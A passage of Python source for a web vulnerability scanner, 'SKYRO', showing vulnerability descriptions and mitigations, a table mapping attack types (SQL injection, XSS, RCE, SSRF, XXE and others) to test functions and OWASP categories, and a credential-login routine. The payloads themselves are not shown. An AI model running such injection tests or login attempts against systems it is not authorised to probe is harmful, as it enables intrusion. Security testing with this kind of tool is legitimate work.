consistency checks, enabling operations to execute more times than intended.", "impact": "High: Can allow duplicate coupon usage, overdraft of account balances, duplicate vote submission, or bypassing rate limits.", "mitigation": "Use atomic database operations and transactions with proper locking. Implement idempotency keys for sensitive operations. Use distributed locks for critical sections. Test concurrent request scenarios explicitly."}, "Denial of Service (ReDoS)": {"description": "A type of Denial of Service attack caused by vulnerable regular expressions that exhibit catastrophic backtracking when processing specially crafted input, consuming excessive CPU time and making the application unresponsive.", "impact": "High: A single malicious request can consume all available CPU, causing denial of service for all other users.", "mitigation": "Audit all regular expressions for catastrophic backtracking using tools like safe-regex or vuln-regex-detector. Use atomic groups and possessive quantifiers. Implement input length limits before regex processing. Set timeouts on regex execution."}, "Denial of Service (Large Payload)": {"description": "The application does not enforce limits on request body size, allowing attackers to send extremely large payloads that exhaust server memory, bandwidth, or processing time.", "impact": "Medium to High: Can cause server instability, memory exhaustion, or complete denial of service for legitimate users.", "mitigation": "Configure maximum request body size limits in the web server and application framework. Implement rate limiting per IP. Reject requests that exceed size limits early in the request pipeline before significant processing occurs."}, "403 Bypass": {"description": "The application\'s access control can be bypassed through URL manipulation techniques such as adding path prefixes (/admin/../admin/), using case variation, adding special characters, or manipulating headers to access restricted resources.", "impact": "High: Attackers can access administrative panels, restricted APIs, or sensitive data that should require elevated privileges.", "mitigation": "Implement access control at the application level, not just URL routing. Use a centralized authorization framework. Test all access control bypasses during security reviews. Do not rely solely on URL patterns for authorization decisions."}, "Sensitive Data in Logs": {"description": "The application logs sensitive data such as passwords, session tokens, credit card numbers, or personal information. These logs may be accessible to administrators, attackers with file system access, or through log aggregation systems.", "impact": "Medium to High: Sensitive credentials or PII in logs can be accessed by anyone with log access, leading to account compromise or privacy violations.", "mitigation": "Audit and sanitize all log statements to remove sensitive data. Implement log scrubbing filters. Use structured logging with explicit field allowlists. Restrict access to log files and implement log retention policies."}, "Missing or Insufficient Logging": {"description": "The application does not generate adequate security-relevant logs, making it impossible to detect attacks, investigate incidents, or maintain audit trails of security-relevant events.", "impact": "Medium: Without logging, attacks may go undetected. Forensic investigation after a breach becomes difficult or impossible. Compliance requirements may be violated.", "mitigation": "Log all authentication events (success, failure, lockout), access control failures, and input validation failures. Include timestamp, source IP, user identity, and the nature of the event. Protect log integrity and ship logs to a centralized SIEM."}, "WordPress xmlrpc Abuse": {"description": "The WordPress xmlrpc.php file is accessible and can be abused for username enumeration, brute-force amplification attacks (using the system.multicall method to try thousands of credentials in a single HTTP request), or DDoS amplification.", "impact": "High: Attackers can use xmlrpc.php to perform credential stuffing at scale, bypassing traditional brute-force protections, or use the server as a DDoS amplifier.", "mitigation": "Disable XML-RPC entirely if not required using a plugin or server configuration. If needed, restrict access by IP. Use a WAF rule to block common XML-RPC attack patterns. Monitor for unusual XML-RPC traffic."}, "WordPress User Disclosure": {"description": "WordPress exposes usernames through the author enumeration feature (?author=1), the REST API (/wp-json/wp/v2/users), or login error messages, allowing attackers to collect valid usernames for targeted attacks.", "impact": "Medium: Exposed usernames significantly reduce the difficulty of brute-force or credential stuffing attacks against the WordPress login page.", "mitigation": "Disable author archives or redirect them. Restrict the REST API users endpoint. Customize login error messages to not differentiate between invalid username and invalid password. Use a security plugin to harden WordPress."}, "Path Traversal": {"description": "The application allows attackers to traverse the directory structure and access files outside the intended directory by manipulating file path parameters with sequences such as ../ or ..\\\\.", "impact": "High: Attackers can read sensitive files (configuration files, credentials, private keys), potentially leading to full system compromise or information disclosure.", "mitigation": "Validate and sanitize all file path inputs. Use a whitelist of allowed paths or filenames. Resolve the canonical path of the requested file and verify it starts with the expected base directory. Avoid using user-supplied input in file path operations."}, "Insecure Deserialization": {"description": "The application deserializes data from untrusted sources without proper validation. Attackers can craft malicious serialized objects to trigger remote code execution, authentication bypass, or privilege escalation.", "impact": "Critical: Remote code execution, authentication bypass, privilege escalation, or denial of service. Ranked as one of the most critical vulnerability classes by OWASP.", "mitigation": "Avoid deserializing data from untrusted sources. Prefer safe data formats like JSON. Implement integrity checks (HMAC signatures) on serialized data. Use deserialization firewalls with class allowlisting. Monitor for deserialization exceptions."}, "Mass Assignment": {"description": "The application automatically binds HTTP request parameters to internal object properties without proper filtering, allowing attackers to set protected or administrative fields not intended for user input.", "impact": "High: Privilege escalation, price manipulation, modification of protected account attributes. An attacker may set is_admin=true or modify prices to zero.", "mitigation": "Use an explicit allowlist of bindable fields. Use Data Transfer Objects (DTOs) to separate external input from domain models. Never bind request data directly to ORM models without filtering. Validate all input server-side."}, "Cryptographic Failures (Weak Algorithm)": {"description": "The application uses deprecated or weak cryptographic algorithms (MD5, SHA1, DES, RC4, 3DES) for storing passwords, generating tokens, or encrypting sensitive data.", "impact": "High: Weak algorithms can be broken with modern computing power, leading to recovery of plaintext passwords, forged tokens, or decryption of sensitive data.", "mitigation": "Migrate to strong algorithms: AES-256 for symmetric encryption, RSA-2048+ or ECC for asymmetric, SHA-256+ for hashing, and bcrypt/Argon2/PBKDF2 for password hashing. Implement a crypto agility strategy to enable algorithm updates."}, "Cryptographic Failures (Hardcoded Secrets)": {"description": "The application contains hardcoded cryptographic keys, API keys, passwords, or other secrets in source code, configuration files, or version control history.", "impact": "Critical: Anyone with access to the source code or version history can retrieve the secret, potentially compromising all data encrypted with that key or all accounts using those credentials.", "mitigation": "Never hardcode secrets in source code. Use environment variables or a secrets management service (HashiCorp Vault, AWS Secrets Manager). Rotate any exposed secrets immediately. Scan repositories for secrets using tools like truffleHog or git-secrets."}, "Information Disclosure (Open Directory Listing)": {"description": "The web server is configured to list the contents of directories that do not have an index file. This exposes file and directory names that may contain sensitive information, backup files, or application source code.", "impact": "Medium: Attackers can enumerate files, discover backup files, configuration files, or sensitive application data that should not be publicly accessible.", "mitigation": "Disable directory listing in the web server configuration (e.g., Options -Indexes in Apache, autoindex off in Nginx). Ensure all directories have appropriate index files or access controls."}, "Information Disclosure (Reflected Parameter)": {"description": "User-supplied input is reflected directly in the response without adequate sanitization. While not a direct vulnerability on its own, it indicates potential for reflected XSS and confirms that input is not being sanitized before output.", "impact": "Low to Medium: Can lead to reflected XSS attacks, phishing, and user manipulation. Confirms insufficient input validation.", "mitigation": "Always encode/escape user input before rendering it in HTML responses. Implement Content-Security-Policy headers and use output encoding libraries appropriate to the context (HTML, JS, URL, CSS)."}, "File Upload Vulnerability (Basic Extension Bypass)": {"description": "The file upload mechanism can be bypassed by manipulating file extensions (e.g., .php.jpg, .phtml) or MIME types. This may allow uploading of executable server-side scripts disguised as allowed file types.", "impact": "Critical: Successful exploitation allows an attacker to upload and execute malicious code on the server, potentially leading to full system compromise, data theft, and persistent backdoor access.", "mitigation": "Validate file types server-side using file content inspection (magic bytes), not just extension or MIME type. Use a whitelist of allowed extensions. Store uploaded files outside the web root and serve them through a controller. Rename uploaded files to random names."}, "Business Logic Error (Simple Case)": {"description": "The application contains flaws in its business logic that can be exploited to achieve unintended outcomes. This includes price manipulation, workflow bypasses, or unauthorized operations that the application did not intend to allow.", "impact": "Medium to High: Attackers can manipulate prices, bypass authentication steps, access unauthorized features, or perform actions outside their privilege level, leading to financial loss or data compromise.", "mitigation": "Implement server-side validation for all business logic rules. Never trust client-supplied values for prices, quantities, or access levels. Conduct thorough business logic testing as part of security reviews. Apply the principle of least privilege throughout workflow design."}, "ReDoS": {"description": "Regular Expression Denial of Service (ReDoS) occurs when an application uses inefficient regular expressions that can be exploited with specially crafted input to cause catastrophic backtracking, consuming excessive CPU resources.", "impact": "Medium to High: Can cause significant performance degradation or complete denial of service for legitimate users. In severe cases, a single request can make the application unresponsive for extended periods.", "mitigation": "Avoid using complex, ambiguous regular expressions. Use regex analysis tools to identify vulnerable patterns. Implement input length limits before regex validation. Consider using linear-time regex engines or timeouts on regex operations."}, "Denial of Service": {"description": "The application is vulnerable to denial of service attacks through resource exhaustion, large payload submission, or other vectors that can overwhelm the server and make it unavailable to legitimate users.", "impact": "High: Service disruption for all users, potential financial losses, and reputational damage. May also be used as a smokescreen for other attacks.", "mitigation": "Implement rate limiting and request throttling. Set maximum request size limits. Use a WAF or DDoS protection service. Implement proper input validation to reject excessively large inputs. Deploy load balancers and autoscaling where appropriate."}, "WordPress Disclosure": {"description": "The WordPress installation is leaking sensitive information such as usernames through the REST API, author pages, or xmlrpc.php. This information can be used to target brute-force attacks or credential stuffing.", "impact": "Medium: Enumerated usernames can be used in brute-force or credential stuffing attacks against WordPress login, significantly increasing the likelihood of successful unauthorized access.", "mitigation": "Disable XML-RPC if not needed. Restrict the REST API user endpoint. Use security plugins to hide username enumeration vectors. Implement login rate limiting and lockout policies. Keep WordPress core, themes, and plugins updated."}, "Insecure API Exposure": {"description": "API endpoints are exposed without adequate authentication or authorization controls, or they reveal sensitive endpoints that should not be publicly accessible. This includes undocumented debug endpoints, administrative APIs, or endpoints returning excessive data.", "impact": "High: Attackers can access sensitive data, perform unauthorized operations, or use exposed endpoints as entry points for further attacks including mass data extraction or administrative actions.", "mitigation": "Implement authentication and authorization on all API endpoints. Use API gateways to manage and monitor access. Disable debug and administrative endpoints in production. Implement rate limiting and input validation. Regularly audit and inventory all API endpoints."}, "Insecure Cryptographic Storage": {"description": "The application stores sensitive data (passwords, PII, financial data) using weak or outdated cryptographic algorithms, or without encryption at all. This includes use of MD5/SHA1 for passwords, ECB mode encryption, or hardcoded keys.", "impact": "Critical: Compromised storage leads to exposure of sensitive user data. Weak hashing algorithms can be reversed, allowing attackers to recover plaintext passwords and compromise user accounts across multiple services.", "mitigation": "Use strong, modern cryptographic algorithms (AES-256-GCM for encryption, bcrypt/Argon2 for password hashing). Never use MD5 or SHA1 for passwords. Manage cryptographic keys securely using a key management service. Implement proper key rotation policies."}, "HTTP Request Smuggling": {"description": "An HTTP request smuggling vulnerability exists due to ambiguities in how the server and reverse proxy parse Content-Length and Transfer-Encoding headers. Attackers can smuggle requests to bypass security controls, poison caches, or hijack other users sessions.", "impact": "Critical: Security control bypass, cache poisoning, credential capture, unauthorized access to internal endpoints, and hijacking of other users requests.", "mitigation": "Normalize HTTP requests at the reverse proxy level. Disable ambiguous Transfer-Encoding handling. Use HTTP/2 end-to-end where possible. Reject requests with both Content-Length and Transfer-Encoding headers. Keep all HTTP infrastructure updated."}, "Prototype Pollution": {"description": "A JavaScript vulnerability where an attacker can inject properties into the global Object prototype through user-controlled input (e.g., JSON merge/assign operations), potentially affecting all objects and enabling XSS or RCE.", "impact": "High: Can bypass security checks relying on object properties, enable denial of service, lead to XSS in client-side code, or RCE in server-side Node.js applications.", "mitigation": "Validate and sanitize all user-supplied keys before using them in object operations. Use Object.create(null) for dictionaries. Avoid unsafe merge/assign functions. Use libraries like lodash with prototype pollution patches. Freeze the Object prototype in critical applications."}, "Server-Side Include (SSI) Injection": {"description": "The web server processes Server-Side Include directives in user-supplied input, allowing attackers to execute server-side commands, include arbitrary files, or leak sensitive information.", "impact": "Critical: Remote command execution, file disclosure, server compromise. SSI injection can allow full server takeover if exploited.", "mitigation": "Disable SSI processing if not required. Never include user input in SSI-processed files. Use output encoding to prevent SSI directives from being processed. Store user content separately from server-side processed templates."}, "CRLF Injection": {"description": "The application allows carriage return (\\r) and line feed (\\n) characters to be injected into HTTP response headers, enabling header injection, response splitting, cookie injection, or cross-site scripting.", "impact": "Medium to High: Can lead to HTTP response splitting, cache poisoning, cookie injection, cross-site scripting, and phishing via header manipulation.", "mitigation": "Sanitize all user input used in HTTP headers by removing or encoding CR (\\r) and LF (\\n) characters. Use framework-provided header functions that handle encoding. Validate redirect URLs and other header values against whitelists."}, "IDOR (Numeric ID Enumeration)": {"description": "The application uses predictable, sequential numeric identifiers in URLs or API parameters. Attackers can enumerate other users objects, profiles, or resources by incrementing or decrementing these IDs.", "impact": "Medium to High: Unauthorized access to other users data, profiles, orders, or documents. Can lead to mass data exposure through automated enumeration.", "mitigation": "Use UUIDs or other non-sequential, cryptographically random identifiers. Implement object-level authorization checks on every request. Do not rely on obscurity of IDs as an access control measure."}, "Sensitive Data Exposure (API)": {"description": "API endpoints return excessive data, expose sensitive internal fields, or are accessible without authentication, leading to unintended disclosure of sensitive user data, system information, or internal application details.", "impact": "High: Mass exposure of user PII, credentials, internal configuration, or business data. Can facilitate further targeted attacks.", "mitigation": "Implement strict response filtering to return only necessary fields. Apply authentication and authorization to all API endpoints. Use API gateways with response sanitization. Regularly audit API responses for sensitive data leakage."}, "Information Disclosure (Debug Mode)": {"description": "The application reveals internal debug information—stack traces, environment variables, framework internals, or verbose exception details—when debug parameters are supplied in requests. Debug mode is intended only for development and should never be reachable in production.", "impact": "High: Exposes server internals, file paths, source code fragments, database credentials, framework versions, and application logic that significantly aid attackers in crafting further exploits.", "mitigation": "Disable debug mode in all production environments. Set DEBUG=False in framework configuration. Implement centralized exception handlers that return generic error pages. Use environment-specific configuration files and ensure production configs never enable debug features."}, "Sensitive Data Exposure": {"description": "The application exposes sensitive data such as API keys, secret tokens, private keys, passwords, or credentials in HTTP responses, JavaScript source, HTML comments, or inline page content accessible to an unauthenticated user.", "impact": "Critical: Exposed credentials can immediately lead to account compromise, infrastructure access, third-party service abuse, or full system takeover depending on the nature of the leaked secret.", "mitigation": "Audit all API responses and rendered pages for sensitive fields. Implement response filtering to strip internal fields. Store secrets in environment variables or a secrets manager, never in source code. Run automated secret-scanning tools (e.g., truffleHog, git-secrets) in CI/CD pipelines. Rotate any exposed credentials immediately."}}')


class SKYROScanner:
    def __init__(self, target_url, max_threads=5, max_depth=3, username=None, password=None, scanning_mode='black-box'):
        self.target_url = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SKYRO Security Scanner/1.0 (Developed by Vikash Kumar Ray)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        self.vulnerabilities = collections.OrderedDict()
        self.scan_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.timeout = 15
        self.checked_urls = set()
        self.total_pages_to_scan = 0
        self.scanned_pages_count = 0
        self.start_time = time.time()
        self.max_threads = max_threads
        self.max_depth = max_depth
        self.rate_limit_delay = 0.2
        
        # ─── Grey box scanning parameters ───────────────────────────────────
        self.scanning_mode = scanning_mode.lower()  # 'black-box' or 'grey-box'
        self.username = username
        self.password = password
        self.is_authenticated = False

        self.payloads = _EMBEDDED_PAYLOADS
        self.vuln_details = _EMBEDDED_VULN_DETAILS

        # Base, explicit vulnerability test functions
        self.vulnerability_tests = {
            'SQL Injection': self.test_sqli,
            'Cross-Site Scripting (XSS)': self.test_xss,
            'Local File Inclusion (LFI)': self.test_lfi,
            'Remote Code Execution (RCE)': self.test_rce,
            'Insecure Direct Object Reference (IDOR)': self.test_idor,
            'Server-Side Request Forgery (SSRF)': self.test_ssrf,
            'Information Disclosure': self.test_info_disclosure,
            'Missing Security Headers': self.test_http_headers,
            'HTTP Methods Enabled': self.test_http_methods_enabled,
            'Cross-Site Request Forgery (CSRF)': self.test_csrf,
            'Authentication Flaws / Session Management': self.test_auth_session,
            'Unvalidated Redirects and Forwards': self.test_unvalidated_redirects,
            'Cookie Manipulation': self.test_cookie_manipulation,
            'Clickjacking': self.test_clickjacking,
            'Broken Access Control': self.test_broken_access_control,
            'Password Brute-Force Weaknesses': self.test_password_brute_force,
            'File Upload Vulnerabilities': self.test_file_upload_vulns,
            'CRLF Injection': self.test_crlf_injection,
            'Host Header Injection': self.test_host_header_injection,
            'Autocomplete Sensitive Forms': self.test_autocomplete,
            'CORS Misconfiguration': self.test_cors,
            # Additional comprehensive tests
            'XML External Entity (XXE)': self.test_xxe,
            'LDAP Injection': self.test_ldap_injection,
            'XPath Injection': self.test_xpath_injection,
            'NoSQL Injection': self.test_nosql_injection,
            'Server-Side Template Injection (SSTI)': self.test_ssti,
            'Remote File Inclusion (RFI)': self.test_rfi,
            'OS Command Injection': self.test_command_injection,
            'Path Traversal': self.test_path_traversal,
            'Open Redirect': self.test_open_redirect,
            'Prototype Pollution': self.test_prototype_pollution,
            'HTTP Request Smuggling': self.test_http_smuggling,
            'Insecure API Exposure': self.test_api_exposure,
            'Debug Mode Information Disclosure': self.test_debug_mode,
            'Sensitive Data Exposure': self.test_sensitive_data_exposure,
        }

        # Map payload.json keys to a canonical vulnerability name (used for vuln type)
        payload_to_vuln_name = {
            'XSS': 'Cross-Site Scripting (XSS)',
            'XSS_DOM': 'Cross-Site Scripting (XSS)',
            'LFI': 'Local File Inclusion (LFI)',
            'RFI': 'Remote File Inclusion (RFI)',
            'RCE': 'Remote Code Execution (RCE)',
            'CommandInjection': 'OS Command Injection',
            'SSRF': 'Server-Side Request Forgery (SSRF)',
            'XXE': 'XML External Entity (XXE)',
            'LDAPInjection': 'LDAP Injection',
            'XPathInjection': 'XPath Injection',
            'NoSQLInjection': 'NoSQL Injection',
            'TemplateInjection': 'Server-Side Template Injection (SSTI)',
            'InfoDisclosure': 'Information Disclosure (Verbose Errors)',
            'UnvalidatedRedirects': 'Unvalidated Redirects and Forwards',
            'BrokenAccessControl': 'Broken Access Control (URL Tampering)',
            'HostHeaderInjection': 'Host Header Injection',
            'CORSBypass': 'CORS Misconfiguration',
            'OpenRedirectPayloads': 'Unvalidated Redirects and Forwards',
            'FourZeroThreeBypass': 'Broken Access Control (URL Tampering)',
            'JWT': 'JWT Security Issues',
            'DefaultCredentials': 'Authentication Flaws (Weak Credentials)',
            'WebSocket': 'WebSocket Message Tampering',
            'GraphQL': 'GraphQL Introspection Enabled',
            'SAML': 'SAML Vulnerabilities',
            'CachePoisoning': 'Web Cache Poisoning',
            'BusinessLogic': 'Business Logic Error (Simple Case)',
            'ReDoS': 'ReDoS',
            'DenialOfService': 'Denial of Service',
            'SecurityHeaders': 'Missing Security Headers (Content-Security-Policy)',
            'SubdomainTakeover': 'Subdomain Takeover',
            'FileUploadBypass': 'File Upload Vulnerability (Basic Extension Bypass)',
            'PathTraversal': 'Local File Inclusion (LFI)',
            'WordPress': 'WordPress Disclosure',
            'APIEndpoints': 'Insecure API Exposure',
            'CloudMetadata': 'SSRF (Cloud Metadata)',
            'CORS_Origins': 'CORS Misconfiguration',
            # New payload groups
            'InsecureDeserialization': 'Insecure Deserialization',
            'MassAssignment': 'Mass Assignment',
            'RaceCondition': 'Race Condition',
            'HTTPRequestSmuggling': 'HTTP Request Smuggling',
            'PrototypePollution': 'Prototype Pollution',
            'ServerSideInclude': 'Server-Side Include (SSI) Injection',
            'CRLF': 'CRLF Injection',
            'OAuth': 'OAuth Misconfiguration',
            'IDORNumeric': 'IDOR (Numeric ID Enumeration)',
            'SensitiveDataExposure': 'Sensitive Data Exposure (API)',
        }

        # Add generic tests for payload groups that don't have a dedicated test function.
        # The generic test will attempt parameter/form injections and flag reflected or indicative responses.
        handled_payload_keys = set([
            # Keys with dedicated test methods (don't add via generic loop)
            'SQLi', 'XSS', 'XSS_DOM', 'LFI', 'RCE', 'SSRF', 'InfoDisclosure',
            'UnvalidatedRedirects', 'BrokenAccessControl',
            # Keys with named wrapper test methods  
            'XXE', 'LDAPInjection', 'XPathInjection', 'NoSQLInjection',
            'TemplateInjection', 'RFI', 'CommandInjection', 'PathTraversal',
            'OpenRedirectPayloads',
            # Keys handled by dedicated tests added in this version
            'CRLF', 'HostHeaderInjection', 'CORS_Origins', 'CORSBypass',
            'PrototypePollution', 'HTTPRequestSmuggling', 'APIEndpoints',
            'SensitiveDataExposure',
        ])

        for payload_key in (self.payloads or {}).keys():
            if payload_key in handled_payload_keys:
                continue
            display_name = payload_to_vuln_name.get(payload_key, payload_key)
            # avoid overwriting explicit tests
            if display_name in self.vulnerability_tests:
                continue
            # attach a closure that calls the generic payload tester for this key
            self.vulnerability_tests[display_name] = (lambda k: (lambda url, forms: self._generic_payload_test(k, url, forms)))(payload_key)

        self.vuln_category_map = {
            # SQL Injection variants
            "SQL Injection (Error-Based)": "A05:2025-Injection",
            "SQL Injection (Time-Based)": "A05:2025-Injection",
            "SQL Injection (Boolean-Based)": "A05:2025-Injection",
            "SQL Injection (UNION-Based)": "A05:2025-Injection",
            "SQL Injection (Authentication Bypass)": "A05:2025-Injection",
            # XSS variants
            "Cross-Site Scripting (XSS)": "A05:2025-Injection",
            "Cross-Site Scripting (Reflected XSS)": "A05:2025-Injection",
            "Cross-Site Scripting (Stored XSS)": "A05:2025-Injection",
            "Cross-Site Scripting (DOM-Based XSS)": "A05:2025-Injection",
            # File inclusion
            "Local File Inclusion (LFI)": "A05:2025-Injection",
            "Remote File Inclusion (RFI)": "A05:2025-Injection",
            # Code execution
            "Remote Code Execution (RCE)": "A05:2025-Injection",
            "OS Command Injection": "A05:2025-Injection",
            "OS Command Injection (Blind)": "A05:2025-Injection",
            # Injection variants
            "Command Injection": "A05:2025-Injection",
            "NoSQL Injection": "A05:2025-Injection",
            "LDAP Injection": "A05:2025-Injection",
            "XPath Injection": "A05:2025-Injection",
            "XML External Entity (XXE)": "A05:2025-Injection",
            "Server-Side Template Injection (SSTI)": "A05:2025-Injection",
            "Server-Side Include (SSI) Injection": "A05:2025-Injection",
            "CRLF Injection": "A05:2025-Injection",
            "Prototype Pollution": "A05:2025-Injection",
            # Access control
            "Insecure Direct Object Reference (IDOR)": "A01:2025-Broken Access Control",
            "Broken Access Control (URL Tampering)": "A01:2025-Broken Access Control",
            "Privilege Escalation (Vertical)": "A01:2025-Broken Access Control",
            "Privilege Escalation (Horizontal)": "A01:2025-Broken Access Control",
            "IDOR (Numeric ID Enumeration)": "A01:2025-Broken Access Control",
            "Mass Assignment": "A01:2025-Broken Access Control",
            "403 Bypass": "A01:2025-Broken Access Control",
            # SSRF / CSRF
            "Server-Side Request Forgery (SSRF)": "A08:2025-Software or Data Integrity Failures",
            "SSRF (Cloud Metadata)": "A08:2025-Software or Data Integrity Failures",
            "Cross-Site Request Forgery (CSRF)": "A06:2025-Insecure Design",
            "CSRF (JSON-Based)": "A06:2025-Insecure Design",
            # Deserialization
            "Insecure Deserialization": "A08:2025-Software or Data Integrity Failures",
            "HTTP Request Smuggling": "A08:2025-Software or Data Integrity Failures",
            # Information disclosure
            "Information Disclosure (Verbose Errors)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (Exposed Server Version)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (PHP Info)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (Git Config)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (.env File)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (Open Directory Listing)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (Reflected Parameter)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (Spring Actuator)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (API Schema Exposure)": "A09:2025-Logging & Alerting Failures",
            "Information Disclosure (Robots.txt)": "A09:2025-Logging & Alerting Failures",
            "Sensitive Data Exposure (API)": "A09:2025-Logging & Alerting Failures",
            "Sensitive Data in Logs": "A09:2025-Logging & Alerting Failures",
            "Missing or Insufficient Logging": "A09:2025-Logging & Alerting Failures",
            # Security headers
            "Missing Security Headers (X-Frame-Options)": "A06:2025-Insecure Design",
            "Missing Security Headers (Content-Security-Policy)": "A06:2025-Insecure Design",
            "Missing Security Headers (Strict-Transport-Security)": "A06:2025-Insecure Design",
            "Missing Security Headers (X-Content-Type-Options)": "A06:2025-Insecure Design",
            "Missing Security Headers (Referrer-Policy)": "A06:2025-Insecure Design",
            "Missing Security Headers (Permissions-Policy)": "A06:2025-Insecure Design",
            "Missing Security Headers (Cache-Control)": "A06:2025-Insecure Design",
            # Authentication
            "Authentication Flaws (Weak Credentials)": "A07:2025-Authentication Failures",
            "Authentication Flaws (Http Login)": "A07:2025-Authentication Failures",
            "Authentication Flaws (Username Enumeration)": "A07:2025-Authentication Failures",
            "Authentication Flaws (Missing Account Lockout)": "A07:2025-Authentication Failures",
            "OAuth Misconfiguration": "A07:2025-Authentication Failures",
            "Two-Factor Authentication (2FA) Bypass": "A07:2025-Authentication Failures",
            "JWT Security Issues": "A07:2025-Authentication Failures",
            "Password Reset Flaws": "A07:2025-Authentication Failures",
            "Weak Password Policy (Generic Check)": "A07:2025-Authentication Failures",
            "SAML Vulnerabilities": "A07:2025-Authentication Failures",
            "WebSocket Authentication Bypass": "A07:2025-Authentication Failures",
            # Session management
            "Session Management Issues (Missing HttpOnly)": "A07:2025-Authentication Failures",
            "Session Management Issues (Missing Secure Flag)": "A07:2025-Authentication Failures",
            "Session Management (Concurrent Sessions)": "A07:2025-Authentication Failures",
            "Session Fixation (Basic Check)": "A07:2025-Authentication Failures",
            # Cookie security
            "Cookie Manipulation (Missing HttpOnly)": "A07:2025-Authentication Failures",
            "Cookie Manipulation (Missing Secure Flag)": "A07:2025-Authentication Failures",
            "Missing Cookie Attributes (HttpOnly/Secure)": "A07:2025-Authentication Failures",
            "Missing Cookie Attributes (SameSite)": "A07:2025-Authentication Failures",
            # Design issues
            "Unvalidated Redirects and Forwards": "A06:2025-Insecure Design",
            "Open Redirect": "A06:2025-Insecure Design",
            "Clickjacking": "A06:2025-Insecure Design",
            "Business Logic Error (Simple Case)": "A06:2025-Insecure Design",
            "Business Logic Flaw (Price Manipulation)": "A06:2025-Insecure Design",
            "Autocomplete Enabled on Sensitive Forms": "A06:2025-Insecure Design",
            "HTTP Methods Enabled (PUT/DELETE/OPTIONS)": "A06:2025-Insecure Design",
            "HTTP Host Header Attack (Basic)": "A06:2025-Insecure Design",
            "Host Header Injection": "A06:2025-Insecure Design",
            "CORS Misconfiguration": "A06:2025-Insecure Design",
            "CORS (JSON-Based)": "A06:2025-Insecure Design",
            "Web Cache Poisoning": "A06:2025-Insecure Design",
            "Race Condition": "A06:2025-Insecure Design",
            # Cryptography
            "Insecure Cryptographic Storage": "A04:2025-Cryptographic Failures",
            "Cryptographic Failures (Weak Algorithm)": "A04:2025-Cryptographic Failures",
            "Cryptographic Failures (Hardcoded Secrets)": "A04:2025-Cryptographic Failures",
            # File upload
            "File Upload Vulnerability (Basic Detection)": "A05:2025-Injection",
            "File Upload Vulnerability (Basic Extension Bypass)": "A05:2025-Injection",
            "File Upload (Extension Bypass)": "A05:2025-Injection",
            "File Upload (Content-Type Bypass)": "A05:2025-Injection",
            "File Upload (Path Traversal via Filename)": "A05:2025-Injection",
            # Supply chain
            "Outdated Libraries or Plugins (Detected via Headers)": "A03:2025-Software Supply Chain Failures",
            # API & advanced
            "Insecure API Exposure": "A05:2025-Injection",
            "Sensitive Data Exposure (API)": "A09:2025-Logging & Alerting Failures",
            "Insecure Direct Object Reference (IDOR) via API": "A01:2025-Broken Access Control",
            "GraphQL Introspection Enabled": "A01:2025-Broken Access Control",
            "GraphQL Authorization Bypass": "A01:2025-Broken Access Control",
            "WebSocket Message Tampering": "A05:2025-Injection",
            # Advanced detection
            "ReDoS": "A05:2025-Injection",
            "Denial of Service": "A05:2025-Injection",
            "Denial of Service (ReDoS)": "A05:2025-Injection",
            "Denial of Service (Large Payload)": "A05:2025-Injection",
            "Subdomain Takeover": "A06:2025-Insecure Design",
            "WordPress Disclosure": "A09:2025-Logging & Alerting Failures",
            "WordPress xmlrpc Abuse": "A09:2025-Logging & Alerting Failures",
            "WordPress User Disclosure": "A09:2025-Logging & Alerting Failures",
            "Path Traversal": "A05:2025-Injection",
            "Insecure Deserialization": "A08:2025-Software or Data Integrity Failures",
            "Mass Assignment": "A01:2025-Broken Access Control",
            "HTTP Request Smuggling": "A08:2025-Software or Data Integrity Failures",
            "Prototype Pollution": "A05:2025-Injection",
            "Server-Side Include (SSI) Injection": "A05:2025-Injection",
            "CRLF Injection": "A05:2025-Injection",
            "IDOR (Numeric ID Enumeration)": "A01:2025-Broken Access Control",
            # Generic fallbacks (map by pattern)
            "HTTP Methods Enabled": "A06:2025-Insecure Design",
            "XML External Entity (XXE)": "A05:2025-Injection",
            "Password Brute-Force Weaknesses": "A07:2025-Authentication Failures",
            "Information Disclosure (Debug Mode)": "A09:2025-Logging & Alerting Failures",
            "Sensitive Data Exposure": "A09:2025-Logging & Alerting Failures",
        }

    # ─────────────────────────────────────────────────────────────────────────
    # FIX: Central HTML-escaping helper
    # ALL user-controlled or external data inserted into HTML must pass through
    # this function. This prevents stored/reflected XSS in the report itself.
    # ─────────────────────────────────────────────────────────────────────────
    @staticmethod
    def e(value):
        """Escape a value for safe HTML insertion. Prevents XSS in the report."""
        if value is None:
            return ""
        return html.escape(str(value), quote=True)

    def authenticate(self):
        """
        Authenticate to the target application using credentials.
        Supports multiple authentication methods:
        1. HTTP Basic Authentication
        2. Form-based login (POST)
        3. Cookie/Session token
        """
        if not self.username or not self.password:
            self.log("No credentials provided for authentication.", "warning")
            return False
        
        try:
            self.log(f"Attempting authentication as '{self.username}'...", "info")
            
            # Try HTTP Basic Auth first
            try:
                auth_response = self.session.get(
                    self.target_url,
                    auth=(self.username, self.password),
                    timeout=self.timeout
                )
                if auth_response.status_code in [200, 201, 302, 303]:
                    self.log(f"HTTP Basic Auth successful (Status: {auth_response.status_code})", "success")
                    self.is_authenticated = True
                    return True
            except Exception as e:
                self.log(f"HTTP Basic Auth failed: {str(e)}", "debug")
            
            # Try common form-based login endpoints
            common_login_paths = [
                '/login', '/admin/login', '/user/login', '/signin', 
                '/auth/login', '/account/login', '/admin/signin'
            ]
            
            for login_path in common_login_paths:
                try:
                    login_url = self.target_url + login_path
                    # Try common form field names
                    for user_field, pass_field in [
                        ('username', 'password'), ('user', 'pass'), ('login', 'password'),
                        ('email', 'password'), ('uname', 'passwd'), ('id', 'password')
                    ]:
                        login_data = {user_field: self.username, pass_field: self.password}
                        response = self.session.post(login_url, data=login_data, timeout=self.timeout)
                        
                        # Check for successful login indicators
                        if response.status_code in [200, 201] and \
